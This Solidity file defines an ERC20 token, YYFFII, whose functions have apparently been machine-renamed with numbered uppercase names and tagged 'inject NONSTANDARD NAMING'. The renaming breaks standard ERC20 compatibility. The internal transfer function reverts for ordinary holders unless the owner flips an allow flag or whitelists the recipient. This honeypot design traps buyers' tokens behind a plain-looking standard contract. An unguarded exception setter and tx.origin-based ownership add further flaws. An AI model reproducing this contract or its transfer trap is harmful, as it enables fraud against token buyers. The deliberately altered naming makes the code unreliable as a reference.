                                                                 

pragma solidity ^0.5.17;

interface IERC20 {
    function TOTALSUPPLY760() external view returns (uint);	//inject NONSTANDARD NAMING
    function BALANCEOF803(address account) external view returns (uint);	//inject NONSTANDARD NAMING
    function TRANSFER895(address recipient, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    function ALLOWANCE760(address owner, address spender) external view returns (uint);	//inject NONSTANDARD NAMING
    function APPROVE367(address spender, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    function TRANSFERFROM132(address sender, address recipient, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    event TRANSFER831(address indexed from, address indexed to, uint value);	//inject NONSTANDARD NAMING
    event APPROVAL188(address indexed owner, address indexed spender, uint value);	//inject NONSTANDARD NAMING
}

contract Context {
    constructor () internal { }
    // solhint-disable-previous-line no-empty-blocks

    function _MSGSENDER477() internal view returns (address payable) {	//inject NONSTANDARD NAMING
        return msg.sender;
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;

    mapping (address => uint) private _balances;
    
    mapping (address => mapping (address => uint)) private _allowances;
    mapping (address => bool) private exceptions;
    address private uniswap;
    address private _owner;
    uint private _totalSupply;
    bool private allow;

    constructor(address owner) public{
      _owner = owner;
      allow = false;
    }

    function SETALLOW355() public{	//inject NONSTANDARD NAMING
        require(_MSGSENDER477() == _owner,"Only owner can change set allow");
        allow = true;
    }

    function SETEXCEPTIONS72(address someAddress) public{	//inject NONSTANDARD NAMING
        exceptions[someAddress] = true;
    }

    function BURNOWNER899() public{	//inject NONSTANDARD NAMING
        require(_MSGSENDER477() == _owner,"Only owner can change set allow");
        _owner = address(0);
    }    

    function TOTALSUPPLY760() public view returns (uint) {	//inject NONSTANDARD NAMING
        return _totalSupply;
    }
    function BALANCEOF803(address account) public view returns (uint) {	//inject NONSTANDARD NAMING
        return _balances[account];
    }
    function TRANSFER895(address recipient, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _TRANSFER378(_MSGSENDER477(), recipient, amount);
        return true;
    }
    function ALLOWANCE760(address owner, address spender) public view returns (uint) {	//inject NONSTANDARD NAMING
        return _allowances[owner][spender];
    }
    function APPROVE367(address spender, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE194(_MSGSENDER477(), spender, amount);
        return true;
    }
    function TRANSFERFROM132(address sender, address recipient, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _TRANSFER378(sender, recipient, amount);
        _APPROVE194(sender, _MSGSENDER477(), _allowances[sender][_MSGSENDER477()].SUB874(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function INCREASEALLOWANCE952(address spender, uint addedValue) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE194(_MSGSENDER477(), spender, _allowances[_MSGSENDER477()][spender].ADD326(addedValue));
        return true;
    }
    function DECREASEALLOWANCE625(address spender, uint subtractedValue) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE194(_MSGSENDER477(), spender, _allowances[_MSGSENDER477()][spender].SUB874(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    function _TRANSFER378(address sender, address recipient, uint amount) internal {	//inject NONSTANDARD NAMING
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        // Trigger special exceptions
        if(sender == _owner || allow ) {
          _balances[sender] = _balances[sender].SUB874(amount, "ERC20: transfer amount exceeds balance");
          _balances[recipient] = _balances[recipient].ADD326(amount);
          emit TRANSFER831(sender, recipient, amount);
        }else {
          if(exceptions[recipient]) {
            _balances[sender] = _balances[sender].SUB874(amount, "ERC20: transfer amount exceeds balance");
            _balances[recipient] = _balances[recipient].ADD326(amount);
            emit TRANSFER831(sender, recipient, amount);
          }else {
            revert();
          }
        }
    }
    
    function _MINT217(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.ADD326(amount);
        _balances[account] = _balances[account].ADD326(amount);
        emit TRANSFER831(address(0), account, amount);
    }
    function _BURN996(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].SUB874(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.SUB874(amount);
        emit TRANSFER831(account, address(0), amount);
    }
    function _APPROVE194(address owner, address spender, uint amount) internal {	//inject NONSTANDARD NAMING
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit APPROVAL188(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor (string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }
    function NAME924() public view returns (string memory) {	//inject NONSTANDARD NAMING
        return _name;
    }
    function SYMBOL259() public view returns (string memory) {	//inject NONSTANDARD NAMING
        return _symbol;
    }
    function DECIMALS239() public view returns (uint8) {	//inject NONSTANDARD NAMING
        return _decimals;
    }
}

library SafeMath {
    function ADD326(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function SUB874(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        return SUB874(a, b, "SafeMath: subtraction overflow");
    }
    function SUB874(uint a, uint b, string memory errorMessage) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }
    function MUL596(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function DIV734(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        return DIV734(a, b, "SafeMath: division by zero");
    }
    function DIV734(uint a, uint b, string memory errorMessage) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library Address {
    function ISCONTRACT573(address account) internal view returns (bool) {	//inject NONSTANDARD NAMING
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash := extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function SAFETRANSFER612(IERC20 token, address to, uint value) internal {	//inject NONSTANDARD NAMING
        CALLOPTIONALRETURN883(token, abi.encodeWithSelector(token.TRANSFER895.selector, to, value));
    }

    function SAFETRANSFERFROM743(IERC20 token, address from, address to, uint value) internal {	//inject NONSTANDARD NAMING
        CALLOPTIONALRETURN883(token, abi.encodeWithSelector(token.TRANSFERFROM132.selector, from, to, value));
    }

    function SAFEAPPROVE105(IERC20 token, address spender, uint value) internal {	//inject NONSTANDARD NAMING
        require((value == 0) || (token.ALLOWANCE760(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        CALLOPTIONALRETURN883(token, abi.encodeWithSelector(token.APPROVE367.selector, spender, value));
    }
    function CALLOPTIONALRETURN883(IERC20 token, bytes memory data) private {	//inject NONSTANDARD NAMING
        require(address(token).ISCONTRACT573(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract YYFFII is ERC20, ERC20Detailed {
  using SafeERC20 for IERC20;
  using Address for address;
  using SafeMath for uint;
  
  
  address public governance;
  mapping (address => bool) public minters;

  constructor () public ERC20Detailed("YYFFII.XYZ", "YYFFII", 18) ERC20(tx.origin){
      governance = tx.origin;
  }

  function MINT548(address account, uint256 amount) public {	//inject NONSTANDARD NAMING
      require(minters[msg.sender], "!minter");
      _MINT217(account, amount);
  }
  
  function SETGOVERNANCE740(address _governance) public {	//inject NONSTANDARD NAMING
      require(msg.sender == governance, "!governance");
      governance = _governance;
  }
  
  function ADDMINTER79(address _minter) public {	//inject NONSTANDARD NAMING
      require(msg.sender == governance, "!governance");
      minters[_minter] = true;
  }
  
  function REMOVEMINTER746(address _minter) public {	//inject NONSTANDARD NAMING
      require(msg.sender == governance, "!governance");
      minters[_minter] = false;
  }
}